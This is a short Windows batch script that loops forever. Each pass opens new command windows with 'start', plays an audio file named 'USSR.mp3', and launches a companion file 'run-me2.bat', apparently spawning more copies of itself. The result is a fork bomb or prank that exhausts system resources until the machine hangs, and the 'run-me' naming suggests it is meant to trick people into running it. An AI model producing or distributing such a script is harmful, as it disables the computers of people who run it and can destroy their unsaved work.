@echo off

:loop
start
Pushd "%~dp0"
USSR.mp3
popd
start
Pushd "%~dp0"
USSR.mp3
popd
start
Pushd "%~dp0"
run-me2.bat
popd
start
Pushd "%~dp0"
run-me2.bat
popd

goto loop
